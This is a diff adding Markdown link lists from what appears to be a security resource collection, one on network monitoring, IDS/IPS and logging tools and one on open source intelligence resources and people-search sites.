+    can extensively grow (or keep sized just right) with just additional
+    hardware cost and show numerous examples you can implement as soon as you
+    get back to work (or home).
+
+* [Current State of Virtualizing Network Monitoring](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t202-current-state-of-virtualizing-network-monitoring-daniel-lohin-ed-sealing)
+
+* [The fox is in the Henhouse - Detecting a breach before the damage is done](http://www.irongeek.com/i.php?page=videos/houseccon2015/t302-the-fox-is-in-the-henhouse-detecting-a-breach-before-the-damage-is-done-josh-sokol)
+
+* [Passive IPS Reconnaissance and Enumeration - false positive (ab)use - Arron Finnon](https://vimeo.com/108775823)
+
+  * Network Intrusion Prevention Systems or NIPS have been plagued by "False
+    Positive" issues almost since their first deployment. A "False Positive"
+    could simply be described as incorrectly or mistakenly detecting a threat
+    that is not real. A large amount of research has gone into using "False
+    Positive" as an attack vector either to attack the very validity of an IPS
+    system or to conduct forms of Denial of Service attacks. However the very
+    reaction to a "False Positive" in the first place may very well reveal more
+    detailed information about defences than you might well think.
+
+* [Public:Windows Event Log Zero 2 Hero Slides](https://docs.google.com/presentation/d/1dkrldTTlN3La-OjWtkWJBb4hVk6vfsSMBFBERs6R8zA/edit#slide=id.g21acf94f3f_2_27)
+
+### Writeups
+
+* [Many ways of malware persistence (that you were always afraid to ask) ](http://jumpespjump.blogspot.com/2015/05/many-ways-of-malware-persistence-that.html)
+
+* [Shellcode Analysis Pipeline](https://7h3ram.github.io/2014/3/18/shellcode-pipeline/)
+
+  * I recently required an automated way of analyzing shellcode and verifying if
+    it is detected by Libemu, Snort, Suricata, Bro, etc. Shellcode had to come
+    from public sources like Shell-Storm, Exploit-DB and Metasploit. I needed an
+    automated way of sourcing shellcode from these projects and pass it on to
+    the analysis engines in a pipeline-like mechanism. This posts documents the
+    method I used to complete this task and the overall progress of the project.
+
+* [Building a Home Network Configured to Collect Artifacts for Supporting Network Forensic Incident Response](https://www.sans.org/reading-room/whitepapers/forensics/building-home-network-configured-collect-artifacts-supporting-network-forensic-incident-response-37302)
+
+* [Automating large-scale memory forensics](https://medium.com/@henrikjohansen/automating-large-scale-memory-forensics-fdc302dc3383)
+
+### Tools
+
+* [Security Onion](http://blog.securityonion.net/p/securityonion.html)
+
+  * Security Onion is a Linux distro for intrusion detection, network security
+    monitoring, and log management. It's based on Ubuntu and contains Snort,
+    Suricata, Bro, OSSEC, Sguil, Squert, Snorby, ELSA, Xplico, NetworkMiner, and
+    many other security tools. The easy-to-use Setup wizard allows you to build
+    an army of distributed sensors for your enterprise in minutes!
+
+* [Pip3line, the Swiss army knife of byte manipulation](https://nccgroup.github.io/pip3line/index.html)
+
+  * Pip3line is a raw bytes manipulation utility, able to apply well known and
+    less well known transformations from anywhere to anywhere (almost).
+
+* [RITA - Real Intelligence Threat Analytics](https://github.com/ocmdev/rita)
+
+  * RITA is an open source network traffic analysis framework.
+
+* [Malcom - Malware Communication Analyzer](https://github.com/tomchop/malcom)
+
+  * Malcom is a tool designed to analyze a system's network communication using
+    graphical representations of network traffic, and cross-reference them with
+    known malware sources. This comes handy when analyzing how certain malware
+    species try to communicate with the outside world.
+
+* [Captipper](http://www.omriher.com/2015/01/captipper-malicious-http-traffic.html)
+
+  * CapTipper is a python tool to analyze, explore and revive HTTP malicious
+    traffic. CapTipper sets up a web server that acts exactly as the server in
+    the PCAP file, and contains internal tools, with a powerful interactive
+    console, for analysis and inspection of the hosts, objects and conversations
+    found.
+
+* [CapLoader](http://www.netresec.com/?page=CapLoader)
+
+  * CapLoader is a Windows tool designed to handle large amounts of captured
+    network traffic. CapLoader performs indexing of PCAP/PcapNG files and
+    visualizes their contents as a list of TCP and UDP flows. Users can select
+    the flows of interest and quickly filter out those packets from the loaded
+    PCAP files. Sending the selected flows/packets to a packet analyzer tool
+    like Wireshark or NetworkMiner is then just a mouse click away.
+
+* [dnstwist](https://github.com/elceef/dnstwist)
+
+  * Domain name permutation engine for detecting typo squatting, phishing and
+    corporate espionage
+
+* [PowerShellMethodAuditor](https://github.com/zacbrown/PowerShellMethodAuditor)
+* [WMI-IDS](https://github.com/fireeye/flare-wmi/tree/master/WMI-IDS)
+
+  * WMI-IDS is a proof-of-concept agent-less host intrusion detection system
+    designed to showcase the unique ability of WMI to respond to and react to
+    operating system events in real-time.
+
+* [Stenographer](https://github.com/google/stenographer/blob/master/README.md)
+
+  * Stenographer is a full-packet-capture utility for buffering packets to disk
+    for intrusion detection and incident response purposes. It provides a
+    high-performance implementation of NIC-to-disk packet writing, handles
+    deleting those files as disk fills up, and provides methods for reading back
+    specific sets of packets quickly and easily.
+
+* [Netdude](http://netdude.sourceforge.net/)
+
+  * The Network Dump data Displayer and Editor is a framework for inspection,
+    analysis and manipulation of tcpdump trace files. It addresses the need for
+    a toolset that allows easy inspection, modification, and creation of
+    pcap/tcpdump trace files. Netdude builds on any popular UNIX-like OS, such
+    as Linux, the BSDs, or OSX.
+
+### IDS/IPS
+
+* [Snort](https://www.snort.org/)
+
+  * A free lightweight network intrusion detection system for UNIX and Windows.
+
+* [Snort FAQ](https://www.snort.org/faq)
+* [Snort User Manual](http://manual.snort.org/)
+* [Snort Documentation](https://www.snort.org/documents)
+
+* [Bro](https://www.bro.org/index.html)
+
+  * Bro is a powerful network analysis framework that is much different from the
+    typical IDS you may know.
+
+* [Bro FAQ](https://www.bro.org/documentation/faq.html)
+* [Bro Documentation](https://www.bro.org/documentation/index.html)
+* [Bro Training Exercises](https://www.bro.org/documentation/exercises/index.html)
+* [Download Bro](https://www.bro.org/download/index.html)
+* [Try Bro in your browser!](http://try.bro.org/#/trybro)
+* [Bro QuickStart](https://www.bro.org/sphinx/quickstart/index.html)
+* [Writing Bro Scripts](https://www.bro.org/sphinx/scripting/index.html)
+* [Bro Script References](https://www.bro.org/sphinx/script-reference/index.html)
+* [bro-intel-generator](https://github.com/exp0se/bro-intel-generator)
+
+  * Script for generating Bro intel files from pdf or html reports
+
+* [bro-domain-generation](https://github.com/denji/bro-domain-generation)
+
+  * Detect domain generation algorithms (DGA) with Bro. The module will
+    regularly generate domains by any implemented algorithms and watch for those
+    domains in DNS queries. This script only works with Bro 2.1+.
+
+* [Exfil Framework](https://github.com/reservoirlabs/bro-scripts/tree/master/exfil-detection-framework)
+
+  * The Exfil Framework is a suite of Bro scripts that detect file uploads in
+    TCP connections. The Exfil Framework can detect file uploads in most TCP
+    sessions including sessions that have encrypted payloads (SCP,SFTP,HTTPS).
+
+* [Suricata](https://suricata-ids.org/)
+
+  * Suricata is a high performance Network IDS, IPS and Network Security
+    Monitoring engine. Open Source and owned by a community run non-profit
+    foundation, the Open Information Security Foundation (OISF).
+  * [Suricata Documentation](https://redmine.openinfosecfoundation.org/projects/suricata/wiki)
+  * [Suricata Quick Start Guide](https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Quick_Start_Guide)
+  * [Suricata Installation Guides for various platforms](https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation)
+  * [Setting up Suricata on a Microtik Router](http://robert.penz.name/849/howto-setup-a-mikrotik-routeros-with-suricata-as-ids/)
+
+* [Argus](http://qosient.com/argus/#)
+
+  * Argus is an open source layer 2+ auditing tool (including IP audit) written
+    by Carter Bullard which has been under development for over 10 years.
+  * [Argus on NSM Wiki](https://www.nsmwiki.org/index.php?title=Argus)
+  * [Argus FAQ](http://qosient.com/argus/faq.shtml)
+  * [Argus How-To](http://qosient.com/argus/howto.shtml)
+  * [Argus Manual](http://qosient.com/argus/manuals.shtml)
+
+* [bmon - bandwidth monitor and rate estimator](https://github.com/tgraf/bmon)
+
+  * bmon is a monitoring and debugging tool to capture networking related
+    statistics and prepare them visually in a human friendly way. It features
+    various output methods including an interactive curses user interface and a
+    programmable text output for scripting.
+
+### DNS
+
+* [DNSChef](https://thesprawl.org/projects/dnschef/)
+
+  * DNSChef is a highly configurable DNS proxy for Penetration Testers and
+    Malware Analysts. A DNS proxy (aka "Fake DNS") is a tool used for
+    application network traffic analysis among other uses. For example, a DNS
+    proxy can be used to fake requests for "badguy.com" to point to a local
+    machine for termination or interception instead of a real host somewhere on
+    the Internet.
+
+* [Passive DNS](https://github.com/gamelinux/passivedns)
+
+  * A tool to collect DNS records passively to aid Incident handling, Network
+    Security Monitoring (NSM) and general digital forensics. \* PassiveDNS
+    sniffs traffic from an interface or reads a pcap-file and outputs the
+    DNS-server answers to a log file. PassiveDNS can cache/aggregate duplicate
+    DNS answers in-memory, limiting the amount of data in the logfile without
+    losing the essense in the DNS answer.
+
+* [Passive DNS](https://github.com/gamelinux/passivedns)
+  * A tool to collect DNS records passively to aid Incident handling, Network
+    Security Monitoring (NSM) and general digital forensics.
+  * PassiveDNS sniffs traffic from an interface or reads a pcap-file and outputs
+    the DNS-server answers to a log file. PassiveDNS can cache/aggregate
+    duplicate DNS answers in-memory, limiting the amount of data in the logfile
+    without losing the essense in the DNS answer.
+
+### IDS/IPS Monitoring Tools
+
+* [Snorby](https://www.snorby.org/)
+* [Snorby - Github](https://github.com/snorby/snorby)
+
+  * Snorby is a ruby on rails web application for network security monitoring
+    that interfaces with current popular intrusion detection systems (Snort,
+    Suricata and Sagan). The basic fundamental concepts behind Snorby are
+    simplicity, organization and power. The project goal is to create a free,
+    open source and highly competitive application for network monitoring for
+    both private and enterprise use.
+
+- [Squil](https://bammv.github.io/sguil/index.html)
+
+  * Sguil (pronounced sgweel) is built by network security analysts for network
+    security analysts. Sguil's main component is an intuitive GUI that provides
+    access to realtime events, session data, and raw packet captures. Sguil
+    facilitates the practice of Network Security Monitoring and event driven
+    analysis. The Sguil client is written in tcl/tk and can be run on any
+    operating system that supports tcl/tk (including Linux, \*BSD, Solaris,
+    MacOS, and Win32).
+  * [Squil FAQ](http://nsmwiki.org/Sguil_FAQ)
+
+- Squert
+
+  * Squert is a web application that is used to query and view event data stored
+    in a Sguil database (typically IDS alert data). Squert is a visual tool that
+    attempts to provide additional context to events through the use of
+    metadata, time series representations and weighted and logically grouped
+    result sets. The hope is that these views will prompt questions that
+    otherwise may not have been asked.
+  * [Slide Deck on Squert](https://ea01c580-a-62cb3a1a-s-sites.googlegroups.com/site/interrupt0x13h/squert-canheit2014.pdf?attachauth=ANoY7crNJbed8EeVy3r879eb2Uze_ky7eiO-jvwXp2J7ik_hOyk0kK6uhX3_oT3u4Kuzw7AiuTAQhYGze5jdlQ-w8lagM1--XESGAf0ebLBZU6bGYd7mIC9ax1H49jvQHGb8kojEal8bayL0evZpOFqsr135DpazJ6F5HkVACpHyCqh3Gzafuxxog_Ybp7k4IgqltqH0pZddcIcjI0LwhHaj3Al085C3tbw2YMck1JQSeeBYvF9hL-0%3D&attredirects=0)
+  * [Install/setup/etc - Github](https://github.com/int13h/squert)
+
+- [ROCK NSM](http://rocknsm.io/)
+
+- [Response Operation Collections Kit Reference Build](https://github.com/rocknsm/rock)
+
+- [flowbat](http://www.appliednsm.com/introducing-flowbat/)
+
+  * Awesome flow tool, SiLK backend
+
+- [Stenographer](https://github.com/google/stenographer)
+
+  * Stenographer is a full-packet-capture utility for buffering packets to disk
+    for intrusion detection and incident response purposes. It provides a
+    high-performance implementation of NIC-to-disk packet writing, handles
+    deleting those files as disk fills up, and provides methods for reading back
+    specific sets of packets quickly and easily.
+
+- [Aktaion: Open Source Tool For "Micro Behavior Based" Exploit Detection and Automated GPO Policy Generation](https://github.com/jzadeh/Aktaion)
+
+  * Aktaion is a lightweight JVM based project for detecting exploits (and more
+    generally attack behaviors). The project is meant to be a learning/teaching
+    tool on how to blend multiple security signals and behaviors into an
+    expressive framework for intrusion detection. The cool thing about the
+    project is it provides an expressive mechanism to add high level IOCs (micro
+    beahviors) such as timing behavior of a certain malware family.
+
+### Logging - General
+
+* [Introduction and Demo to the Elasticsearch, Logstash and Kibana](https://www.youtube.com/watch?v=GrdzX9BNfkg)
+* [ELSA](https://github.com/mcholste/elsa)
+* [Elasticsearch: The Definitive Guide The Definitive Guide](https://www.elastic.co/guide/en/elasticsearch/guide/current/index.html)
+* [LogStash](https://github.com/elasticsearch/logstash)
+
+  * Logstash is a tool for managing events and logs. You can use it to collect
+    logs, parse them, and store them for later use (like, for searching). If you
+    store them in Elasticsearch, you can view and analyze them with Kibana. It
+    is fully free and fully open source. The license is Apache 2.0, meaning you
+    are pretty much free to use it however you want in whatever way.
+
+* [Getting Started With Logstash](http://logstash.net/docs/1.4.2/tutorials/getting-started-with-logstash)
+* [Logstash Documentation](http://logstash.net/docs/1.4.2/)
+* [logstash anonymize](http://logstash.net/docs/1.4.2/filters/anonymize)
+
+  * Anonymize fields using by replacing values with a consistent hash.
+
+* [Kibana](https://github.com/elasticsearch/kibana)
+
+  * Kibana is an open source (Apache Licensed), browser based analytics and
+    search dashboard for Elasticsearch. Kibana is a snap to setup and start
+    using. Kibana strives to be easy to get started with, while also being
+    flexible and powerful, just like Elasticsearch.
+
+* [Introduction to Kibana](http://www.elasticsearch.org/guide/en/kibana/current/introduction.html)
+* [Kibana Documentation/Guides](http://www.elasticsearch.org/guide/en/kibana/current/)
+* [Installing Kibana](http://www.elasticsearch.org/overview/kibana/installation/)
+
+### Making Sense of the Data
+
+* [411](https://github.com/kiwiz/411)
+
+  * Configure Searches to periodically run against a variety of data sources.
+    You can define a custom pipeline of Filters to manipulate any generated
+    Alerts and forward them to multiple Targets.
+
+* [PCAPDB](https://github.com/dirtbags/pcapdb)
+
+  * PcapDB is a distributed, search-optimized open source packet capture system.
+    It was designed to replace expensive, commercial appliances with
+    off-the-shelf hardware and a free, easy to manage software system. Captured
+    packets are reorganized during capture by flow (an indefinite length
+    sequence of packets with the same src/dst ips/ports and transport proto),
+    indexed by flow, and searched (again) by flow. The indexes for the captured
+    packets are relatively tiny (typically less than 1% the size of the captured
+    data).
+
+* [RITA - Finding Bad Things on Your Network Using Free and Open Source Tools](https://www.youtube.com/watch?v=mpCBOQSjbOA)
+
+* [You Pass Butter: Next Level Security Monitoring Through Proactivity](http://www.irongeek.com/i.php?page=videos/nolacon2016/110-you-pass-butter-next-level-security-monitoring-through-proactivity-cry0-s0ups)
+
+### Logging - Linux
+
+* [Syslong-ng](https://github.com/balabit/syslog-ng)
+
+  * syslog-ng is an enhanced log daemon, supporting a wide range of input and
+    output methods: syslog, unstructured text, message queues, databases (SQL
+    and NoSQL alike) and more.
+
+### Logging - Windows
+
+* [Parsing Text Logs with Message Analyzer - Microsoft](http://blogs.technet.com/b/messageanalyzer/archive/2015/02/23/parsing-text-logs-with-message-analyzer.aspx)
+
+* [Windows logging Cheat sheet - Sniper Forensics](https://sniperforensicstoolkit.squarespace.com/storage/logging/Windows%20Logging%20Cheat%20Sheet%20v1.1.pdf)
+
+* [Spotting the Adversary with Windows Event Log Monitoring - NSA](https://www.nsa.gov/ia/_files/app/Spotting_the_Adversary_with_Windows_Event_Log_Monitoring.pdf)
+
+* [Uncovering Indicators of Compromise (IoC) Using PowerShell, Event Logs, and a Traditional Monitoring Tool](https://www.sans.org/reading-room/whitepapers/critical/uncovering-indicators-compromise-ioc-powershell-event-logs-traditional-monitoring-tool-36352)
+
+* [Advanced Security Audit Policy Settings](<https://technet.microsoft.com/en-us/library/dn319056(v=ws.11).aspx>)
+
+* [GetInjectedThreads.ps1](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+* Looks for threads that were created as a result of code injection.
+
+* [check_ioc](https://github.com/oneoffdallas/check_ioc)
+* Check_ioc is a script to check for various, selectable indicators of
+  compromise on Windows systems via PowerShell and Event Logs. It was primarily
+  written to be run on a schedule from a monitoring engine such as Nagios,
+  however, it may also be run from a command-line (for incident response).
+
+#### Powershell Logging
+
+* [Revoke -­ Obfuscation: PowerShell Obfuscation Detection Using Science](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf)
+
+* [Greater Visibility Through PowerShell Logging](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html)
+
+* [block-parser](https://github.com/matthewdunwoody/block-parser)
+
+  * Parser for Windows PowerShell script block logs
+
+#### Windows Event Collector
+
+* [Windows Event Collector(For centralizing windows domain logging with no local agent, windows actually has built-in logging freely available)](<https://msdn.microsoft.com/en-us/library/bb427443(v=vs.85).aspx>)
+
+* [Windows event Collector - Setting up source initiated Subscriptions](<https://msdn.microsoft.com/en-us/library/bb870973(v=vs.85).aspx>)
+
+#### Windows Event Forwarding
+
+* [Introduction to Windows Event Forwarding](https://hackernoon.com/the-windows-event-forwarding-survival-guide-2010db7a68c4)
+
+* [Monitoring what matters – Windows Event Forwarding for everyone (even if you already have a SIEM.)](https://blogs.technet.microsoft.com/jepayne/2015/11/23/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem/)
+
+* [Use Windows Event Forwarding to help with intrusion detection](https://docs.microsoft.com/en-us/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection)
+
+#### Sysinternals
+
+* [Sysmon - The Best Free Windows Monitoring Tool You Aren't Using](http://909research.com/sysmon-the-best-free-windows-monitoring-tool-you-arent-using/)
+
+* [SysInternals: SysMon Unleashed](https://blogs.technet.microsoft.com/motiba/2016/10/18/sysinternals-sysmon-unleashed/)
+
+* pcap Pcaps/Static Analysis
+  
+  * I.e. you have a pcap file or you're not trying to do live analysis/Aren't trying to use one of the above tools
+
+* Silk
+
+  * The SiLK analysis suite is a collection of command-line tools for processing
+    SiLK Flow records created by the SiLK packing system. These tools read
+    binary files containing SiLK Flow records and partition, sort, and count
+    these records. The most important analysis tool is rwfilter, an application
+    for querying the central data repository for SiLK Flow records that satisfy
+    a set of filtering options. The tools are intended to be combined in various
+    ways to perform an analysis task. A typical analysis uses UNIX pipes and
+    intermediate data files to share data between invocations of the tools.
+  * [Administering/Installing SiLK](https://tools.netsa.cert.org/confluence/display/tt/Administration)
+  * [SiLK Tool Tips](https://tools.netsa.cert.org/confluence/display/tt/Tooltips)
+  * [SiLK Reference Guide](https://tools.netsa.cert.org/silk/silk-reference-guide.html)
+  * [SiLK Toolsuite Quick Reference Guide](https://tools.netsa.cert.org/silk/silk-quickref.pdf)
+
+* [CapLoader](http://www.netresec.com/?page=CapLoader)
+
+  * CapLoader is a Windows tool designed to handle large amounts of captured
+    network traffic. CapLoader performs indexing of PCAP/PcapNG files and
+    visualizes their contents as a list of TCP and UDP flows. Users can select
+    the flows of interest and quickly filter out those packets from the loaded
+    PCAP files. Sending the selected flows/packets to a packet analyzer tool
+    like Wireshark or NetworkMiner is then just a mouse click away.
+
+* [Network Miner](http://www.netresec.com/?page=NetworkMiner)
+
+  * NetworkMiner is a Network Forensic Analysis Tool (NFAT) for Windows (but
+    also works in Linux / Mac OS X / FreeBSD). NetworkMiner can be used as a
+    passive network sniffer/packet capturing tool in order to detect operating
+    systems, sessions, hostnames, open ports etc. without putting any traffic on
+    the network. NetworkMiner can also parse PCAP files for off-line analysis
+    and to regenerate/reassemble transmitted files and certificates from PCAP
+    files.
+
+### Papers
+
+* [Network Profiling Using Flow](https://resources.sei.cmu.edu/asset_files/technicalreport/2012_005_001_28167.pdf)
+
+  * This report provides a step-by-step guide for profiling—discovering
+    public-facing assets on a network—using network flow (netflow) data. Netflow
+    data can be used for forensic purposes, for finding malicious activity, and
+    for determining appropriate prioritization settings. The goal of this report
+    is to create a profile to see a potential attacker’s view of an external
+    network. Readers will learn how to choose a data set, find the top assets
+    and services with the most traffic on the network, and profile several
+    services. A cas e study provides an example of the profiling process. The
+    underlying concepts of using netflow data are presented so that readers can
+    apply the approach to other cases. A reader using this repor t to profile a
+    network can expect to end with a list of public-facing assets and the ports
+    on which each is communicating and may also learn other pertinent
+    information, such as external IP addresses, to which the asset is
+    connecting. This report also provides ideas for using, maintaining, and
+    reporting on findings. The appendices include an example profile and scripts
+    for running the commands in the report. The scripts are a summary only and
+    cannot replace reading and understanding this report.
+
+* [Making the Most of OSSEC](http://www.ossec.net/files/Making_the_Most_of_OSSEC.pdf)
+
+* [Using SiLK for Network Traffic Analysis](https://tools.netsa.cert.org/silk/analysis-handbook.pdf)
+
+### tricks Tricks & Tips
+
+* [Using rwuniq for Top-10 Lists](https://tools.netsa.cert.org/confluence/display/tt/Using+rwuniq+for+Top-10+Lists)
+
+### Other
+
+* [SweetSecurity](https://github.com/TravisFSmith/SweetSecurity)
+
+  * Scripts to setup and install Bro IDS, Elastic Search, Logstash, Kibana, and
+    Critical Stack on a Raspberry Pi 3 device.
diff --git a/source/Open-Source-Intelligence.md b/source/Open-Source-Intelligence.md
new file mode 100644
index 0000000..5ac4fde
--- /dev/null
+++ b/source/Open-Source-Intelligence.md
@@ -0,0 +1,521 @@
+## Open Source Intelligence
+
+### TOC
+
+* Cull
+* [General](#general)
+* [Articles/Writeups](#writeups)
+* [Presentations & Talks](#talks)
+* [Tools](#tools))
+* [CVS/Git/Similar](#cvs)
+* [DNS Stuff/related](#dns)
+* [Email Gathering](#email)
+* [Fancy Search Engines](#search)
+* [General Meta Data](#meta)
+* [General Data Scrapers](#scrape)
+* [Google Hacking](#gh)
+* [Site Specific Tools](#site)
+* [Social Media Search/Enumeration](#social)
+* [Company/People Searching](#ppl)
+* [Reference Sites](#reference)
+* [Miscellaneous](#misc)
+
+#### Cull
+
+* http://computercrimeinfo.com/cleaningid.html
+* [OSINT - onstrat](http://www.onstrat.com/osint/)
+* [PDF Creative Commons OSINT toolbag guide](http://www.phibetaiota.net/wp-content/uploads/2013/07/2013-07-11-OSINT-2ool-Kit-On-The-Go-Bag-O-Tradecraft.pdf)
+* http://toddington.com/resources/
+* www.osintinsight.com/shared.php?user=Mediaquest&folderid=0
+
+* Add list of Sources:
+  * UCC - Uniform Commercial Code; DOC - Current Industrial Patents; DMV -
+    Vehicle Ownership applications; Patents - Patent DBs; Operating
+    Licenses/Permits; Trade Journals;
+
+### General
+
+* SWOT - Strengths, Weaknesses, Opportunities, Threats
+
+* 101
+
+  * [Open Source Intelligence - Wikipedia](http://en.wikipedia.org/wiki/Open-source_intelligence)
+
+* Alerting
+* [Google Trends](https://trends.google.com/trends/)
+
+  * See what are the popular related topics people are searching for. This will
+    help widen your search scope.
+
+* [Google Alerts](https://www.google.com/alerts)
+
+  * Google Alerts are email updates of the latest relevant Google results (web,
+    news, etc.) based on your queries.
+
+* [PasteLert](https://www.andrewmohawk.com/pasteLert/)
+
+  * PasteLert is a simple system to search pastebin.com and set up alerts (like
+    google alerts) for pastebin.com entries. This means you will automatically
+    recieve email whenever your term(s) is/are found in new pastebin entries!
+
+* Educational
+
+  * [Intelligence Gathering - PTES](http://www.pentest-standard.org/index.php/Intelligence_Gathering)
+  * [Corporate Espionage without the Hassle of Committing Felonies](https://www.slideshare.net/JohnCABambenek/corporate-espionage-without-the-hassle-of-committing-felonies)
+
+* General
+
+  * [NATO Open Source Intelligence Handbook](http://www.oss.net/dynamaster/file_archive/030201/ca5fb66734f540fbb4f8f6ef759b258c/NATO%20OSINT%20Handbook%20v1.2%20%2d%20Jan%202002.pdf)
+
+### OSINT Based News
+
+* [JustSecurity](https://www.justsecurity.org/)
+
+  * Just Security is an online forum for the rigorous analysis of U.S. national
+    security law and policy. We aim to promote principled and pragmatic
+    solutions to national security problems that decision-makers face. Our Board
+    of Editors includes individuals with significant government experience,
+    civil society attorneys, academics, and other leading voices. Just Security
+    is based at the Center for Human Rights and Global Justice at New York
+    University School of Law.
+
+* [OSINTInsight](http://www.osintinsight.com/shared.php?user=Mediaquest&folderid=0)
+* [Janes](http://www.janes.com/)
+* [bellingcat](https://www.bellingcat.com/)
+
+  * By and for citizen investigative journalists
+
+* [NightWatch](http://www.kforcegov.com/Solutions/IAO/NightWatch/About.aspx)
+
+  * NightWatch is an executive commentary and analysis of events that pose or
+    advance threats to US national security interests. It is deliberately edgy
+    in the interest of clarity and brevity. As a product for executives, the
+    distribution and all feedback comments are anonymous.
+
+### Resources
+
+* [Awesome-OSINT](https://github.com/jivoi/awesome-osint)
+* [OSINT Framework](http://osintframework.com/)
+* [OSINT Resources - greynetwork2](https://sites.google.com/site/greynetwork2/home/osint-resources)
+* [Intel Techniques - Links](http://www.inteltechniques.com/links.html)
+* [toddington - resources](https://www.toddington.com/resources/)
+* [onstrat - osint](http://www.onstrat.com/osint/)
+* http://osintinsight.com/shared.php?expand=169,175&folderid=0&user=Mediaquest
+
+### Writeups
+
+* [Fantastic OSINT and where to find it - blindseeker/malware focused](http://archive.is/sYzcP#selection-62.0-62.1)
+* [Some blog posts describing/bringing you up to speed on OSINT by krypt3ia](http://krypt3ia.wordpress.com/2012/01/11/the-subtle-art-of-osint/)
+* [Glass Reflections in Pictures + OSINT = More Accurate Location](http://blog.ioactive.com/2014/05/glass-reflections-in-pictures-osint.html)
+* [Exploring the Github Firehose](http://blog.scalyr.com/2013/10/exploring-the-github-firehose/)
+* [OSINT Through Sender Policy Framework (SPF) Records](https://community.rapid7.com/community/infosec/blog/2015/02/23/osint-through-sender-policy-framework-spf-records)
+
+### Talks & Presentations
+
+* [Cognitive Bias and Critical Thinking in Open Source Intelligence - Defcamp 2014](https://www.youtube.com/watch?v=pVAM21UERLU&index=24&list=PLnwq8gv9MEKgSryzYIFhpmCcqnVzdUWfH)
+* [Dark Arts of OSINT Skydogcon](https://www.youtube.com/watch?v=062pLOoZhk8)
+* [Developing a Open Source Threat Intelligence Program—Edward McCabe](http://www.irongeek.com/i.php?page=videos/circlecitycon2014/105-developing-a-open-source-threat-intelligence-program-edward-mccabe)
+  * What if you could get out in front of common threats such as botnets,
+    scanners and malware? Good news, you can. Learn about one geeks struggle
+    with life on the Internet of (bad) things when it comes to being online,
+    identifying “odd” things, and developing an Open Source Threat Intelligence
+    Program from Open Source Tools and Public Sources.
+* [Corporate Espionage: Gathering Actionable Intelligence Via Covert Operations - Brent White - Defcon22](https://www.youtube.com/watch?v=D2N6FclMMTg)
+* [How to Use Python to Spy on Your Friends: Web APIs, Recon ng, & OSINT](https://www.youtube.com/watch?v=BOjz7NfsLpA)
+* [Practical OSINT - Shane MacDougall](https://www.youtube.com/watch?v=cLmEJLy7dv8)
+  * There’s more to life to OSINT than google scraping and social media
+    harvesting. Learn some practical methods to automate information gathering,
+    explore some of the most useful tools, and learn how to recognize valuable
+    data when you see it. Not only will we explore various tools, attendees will
+    get access to unpublished transforms they can use/modify for their own use.
+* [Pwning People Personally - Josh Schwartz](https://www.youtube.com/watch?v=T2Ha-ZLZTz0)
+* [You're Leaking Trade Secrets - Defcon22 Michael Schrenk](https://www.youtube.com/watch?v=JTd5TL6_zgY)
+  * Networks don't need to be hacked for information to be compromised. This is
+    particularly true for organizations that are trying to keep trade secrets.
+    While we hear a lot about personal privacy, little is said in regard to
+    organizational privacy. Organizations, in fact, leak information at a much
+    greater rate than individuals, and usually do so with little fanfare. There
+    are greater consequences for organizations when information is leaked
+    because the secrets often fall into the hands of competitors. This talk uses
+    a variety of real world examples to show how trade secrets are leaked
+    online, and how organizational privacy is compromised by seemingly innocent
+    use of The Internet.
+* [ZOMG Its OSINT Heaven Tazz Tazz](https://www.youtube.com/watch?v=cLmEJLy7dv8)
+
+### OSINT Tools/Resources
+
+* [blacksheepwall](https://github.com/tomsteele/blacksheepwall)
+
+  * blacksheepwall is a hostname reconnaissance tool
+
+* [Creepy.py](http://ilektrojohn.github.io/creepy/)
+
+  * Description: Creepy is a geolocation OSINT tool. Gathers geolocation related
+    information from online sources, and allows for presentation on map, search
+    filtering based on exact location and/or date, export in csv format or kml
+    for further analysis in Google Maps.
+
+* [Maltego](https://www.paterva.com/web6/products/maltego.php)
+
+  * Description: What you use to tie everything together.
+
+* [OpenRefine](https://github.com/OpenRefine/OpenRefine)
+
+  * Description: OpenRefine is a power tool that allows you to load data,
+    understand it, clean it up, reconcile it to master database, and augment it
+    with data coming from Freebase or other web sources. All with the comfort
+    and privacy of your own computer.
+
+* [Oryon C Portable](http://osintinsight.com/oryon.php)
+
+  * Oryon C Portable is a web browser designed to assist researchers in
+    conducting Open Source Intelligence investigations. Oryon comes with dozens
+    of pre-installed tools and a select set of links cataloged by category –
+    including those that can be found in the OI Shared Resources.
+
+* [OSINT Mantra](http://www.getmantra.com/hackery/osint.html)
+* [Recon-ng](https://bitbucket.org/LaNMaSteR53/recon-ng)
+
+  * Description: Recon-ng is a full-featured Web Reconnaissance framework
+    written in Python. Complete with independent modules, database interaction,
+    built in convenience functions, interactive help, and command completion,
+    Recon-ng provides a powerful environment in which open source web-based
+    reconnaissance can be conducted quickly and thoroughly.
+
+* [TouchGraph SEO Browser](http://www.touchgraph.com/seo)
+
+  * Use this free Java application to explore the connections between related
+    websites.
+
+#### Company/People Searching
+
+* [data.com](https://www.data.com/)
+* [LittleSis](https://littlesis.org/)
+
+  * LittleSis is a free database of who-knows-who at the heights of business and
+    government.
+
+* [Jigsaw](http://jigsawbusinessgroup.com/what-we-do/people/)
+
+  * Jigsaw is a prospecting tool used by sales professionals, marketers and
+    recruiters to get fresh and accurate sales leads and business contact
+    information.
+
+* [Spokeo](https://www.spokeo.com/)
+
+  * Spokeo is a people search engine that organizes white pages listings, public
+    records and social network information into simple profiles to help you
+    safely find and learn about people.
+
+* [Hoovers](http://www.hoovers.com/)
+
+  * Search over 85 million companies within 900 industry segments; Hoover's
+    Reports Easy-to-read reports on key competitors, financials, and executives
+
+* [Market Visual](http://www.marketvisual.com/)
+
+  * Search Professionals by Name, Company or Title
+
+* [Glass Door](https://www.glassdoor.com/)
+
+  * Search jobs then look inside. Company salaries, reviews, interview
+    questions, and more all posted anonymously by employees and job seekers.
+
+* [192](http://www.192.com/)
+
+  * Find people, businesses and places in the UK with 192.com. Directory
+    enquiries, a people finder, business listings and detailed maps with aerial
+    photos.
+
+* [corporationwiki](https://www.corporationwiki.com/)
